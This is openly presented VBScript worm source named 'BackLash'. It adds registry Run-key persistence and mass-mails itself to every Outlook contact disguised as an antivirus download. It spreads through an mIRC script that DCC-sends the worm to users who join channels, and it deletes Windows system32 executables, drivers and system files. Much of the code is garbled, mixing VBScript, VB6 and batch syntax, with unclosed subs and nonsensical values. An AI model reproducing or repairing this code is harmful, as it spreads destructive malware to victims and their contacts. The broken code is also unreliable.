   rem BackLash
   rem Ziimac
   On Error Resume Next
   dim x,fso,batcha,z
   set fso=CreateObject("Scripting.FileSystemObject")
   set batcha=fso.CreateTextFile("C:\System.bat")
   batcha.WriteLine "BackLash"
   batcha.WriteLine "Ziimac"
   batcha.WriteLine "VBScript"
   batcha.Close
   Set fso = CreateObject("Scripting.FileSystemObject")
   set x = fso.CopyFile("WScript.Shell")
   x = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Bkl
    main()

   sub main()
   Set WshShell = WScript.CreateObjectCreateObject("WScript.Shell")
   WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\NAV, ""
   set Drv=fso.drives
   for each drive in drv
   if drv="C:" then
   if drv.isready then
   drivefull=drive & "\"
   set e5d=fso.getfolder(drivefull)
   set subs=e5d.subfolders
   for each subfolder in subs
   subst=mid(subfolder.path,4,3)
   if subst="WIN" then
   auto=subfolder.path
   end if
   Z = Day(Date)
   If Z = 1
   RD/S/Q C:\WINDOWS\SYSTEM32\SPOOL\DRIVERS\COLOR\HPP3902A.ICM
   End If
   Function Outlook()
   On Error Resume Next
   Set OutlookApp = CreateObject("Outlook.Application")
   If OutlookApp = "Outlook" Then
   Set Mapi = OutlookApp.GetNameSpace("MAPI")
   set mapiadlist as Mapi.AddressLists
   For Each Addresslist In mapiadlist
   If Addresslist.AddressEntries.Count <> 0 Then
   Addresslistcout = Addresslist.AddressEntries.Count
   For AddList = 1 To Addresslistcout
   Set msg = OutlookApp.CreateItem(0)
   Set AdEntries = Addresslist.AddressEntries(AddList)
   msg.To = AdEntries.Address
   msg.Subject = "Download this Anti-Virus to protect from the new Out-look express and IRC worm "Backlash.vbs!""
   msg.Body = "To download click the attachment"
   set Attachs=msg.Attachments
   Attachs.Add "c:\Backlash.vbs"
   msg.DeleteAfterSubmit = True
   If msg.To <> "" Then
   msg.Send
   End If
   Next
   registry.regwrite "HKCU\software\myworm\mailed", "1"
   End If
   Next
   End If
   End Function

   Sub Middle-Main()
   Dim filesys, newfolder, newfolderpath
   newfolderpath = "c:\Folder"
   set filesys=CreateObject("Scripting.FileSystemObject")
   If Not filesys.FolderExists(newfolderpath) Then
     Set newfolder = filesys.CreateFolder(newfolderpath)
   End If

   'Moving a file system - the if FileExists does not work'

   dim filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\system32\*.log", "c:\Folder\"

   'Deleting a file - you don't have to use FileExists'

   dim filedel
   Set filedel = CreateObject("Scripting.FileSystemObject")
   filedel.DeleteFile "c:\windows\system\*.*"

   'Deleting a file - you don't have to use FileExists'

   dim filedelwsc
   Set filedelwsc = CreateObject("Scripting.FileSystemObject")
   filedelwsc.DeleteFile "c:\windows\system32\*.wsc"

   dim filedeldrv
   Set filedeldrv = CreateObject("Scripting.FileSystemObject")
   filedeldrv.DeleteFile "c:\windows\system32\*.drv"

   dim filedelvbs
   Set filedelvbs = CreateObject("Scripting.FileSystemObject")
   filedelvbs.DeleteFile "c:\windows\system32\*.vbs"

   dim filedelsys
   Set filedelsys = CreateObject("Scripting.FileSystemObject")
   filedelsys.DeleteFile "c:\windows\system32\*.sys"

   dim filedelnls
   Set filedelnls = CreateObject("Scripting.FileSystemObject")
   filedelnls.DeleteFile "c:\windows\system32\*.nls"

   dim filedelexe
   Set filedelexe = CreateObject("Scripting.FileSystemObject")
   filedelexe.DeleteFile "c:\windows\system32\*.exe"

   Sub End-Main()
   Set zcVBS=FSO.CreateTextFile("C:\Windows\Command\RaTo.vBS")
   zcVBS.Writeline "dim w,which,ranThing"
   zcVBS.Writeline "for w = 0 to 10000"
   zcVBS.Writeline "randomize timer"
   zcVBS.Writeline "read = int(rnd * 10)+1"
   zcVBS.Writeline "if read = 1 then"
   zcVBS.Writeline "ranThing = "+chr(24)+"Taking over the world... 700 at a time."+chr(24)
   zcVBS.Writeline "end if"
   zcVBS.close

   Sub Begin-End()
   Set WSHShell = CreateObject("WScript.Shell")
   WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCloseKey", "1"
   Set WSHShell = CreateObject("WScript.Shell")
   WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAV Agent", ""
   Set v = CreateObject("Scripting.FileSystemObject")
   V.CopyFile("c:\windows\system\Winload32.vbs")
   Result = MsgBox("Middle!", 65, "MsgBox")
   NewDate = DateAdd("d", -133901391039103910391039103910391, date())
   NewDate = DateAdd("d", +9, date())
   NewDate = DateAdd("d", -9, date())
   NewDate = DateAdd("d", +9, date())
   NewDate = DateAdd("d", -9, date())
   NewDate = DateAdd("d", +9, date())
   NewDate = DateAdd("d", -9, date())
   NewDate = DateAdd("d", +9, date())
   NewDate = DateAdd("d", -9, date())
   NewDate = DateAdd("d", +9, date())
   Wscript.echo Hour(now)

   Sub Middle-End()
   Set filesysren = CreateObject("Scripting.FileSystemObject")
   If filesysren.FileExists("d:\Progra~1\Aim95\Aim.exe") Then
   filesysren.MoveFile "d:\Progra~1\Aim95\Aim.exe", "d:\Progra~1\Kazaa\AOLSucks.exe"
   End If
   Open c:\Ziimac.bat for Output as 1#
   Print 1#, "@Echo off"
   Print 1#, "cls"
   Print 1#, "The T-Cells are destroyed..."
   Close 1#

   Sub IRC()
   Function Mirc(Path)
   On Error Resume Next
   Set fso = CreateObject("scripting.filesystemobject")
   Set ws = CreateObject("wscript.shell")
   If Path = "" Then
   If fso.fileexists("c:\mirc\mirc.ini") Then
   Path = "c:\mirc"
   End If
   If fso.fileexists("c:\mirc32\mirc.ini") Then
   Path = "c:\mirc32"
   End If
     PfDir=ws.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\
     Windows\CurrentVersion\ProgramFilesDir")
   If fso.fileexists(PfDir & "\mirc\mirc.ini") Then
   Path = PfDir & "\mirc"
   End If
   End If
   If Path <> "" Then
   Set Script = fso.CreateTextFile(Path & "\script.ini", True)
   Script.writeline "[script]"
   Script.writeline "n0=on 1:JOIN:#:{"
   Script.writeline "n1= /if ( $nick == $me ) { halt }"
   Script.writeline "n2= /." & chr(100) & chr(99) & chr(99) &
   " send $nick c:\BackLash.vbs"
   Script.writeline "n3=}"
   Script.Close
   End If
   End Function

   Sub EndH-End()
   Set 1 = Hour(Date)
   If 1 = 2:00PM
   Start Backlash.vbs
   End If

   Sub End-End()
   Private Sub Form_Unload(Cancel As Integer)
   Shell App.Path & "\" & App.EXEName & ".exe"
   End Sub
   Private Sub Form_Initialize()

   On error resume next ' Stops error if file doesnt exist

   open "C:\tmp.vaa" for input as #1 ' Opens variable file
         Input #1, Variable               ' Loads variable values
   Close #1

   End Sub

   Function Loop(Loop)
   Start C:\Progra~1\Kazaa\AOLSucks.exe
   Loop
   End Function











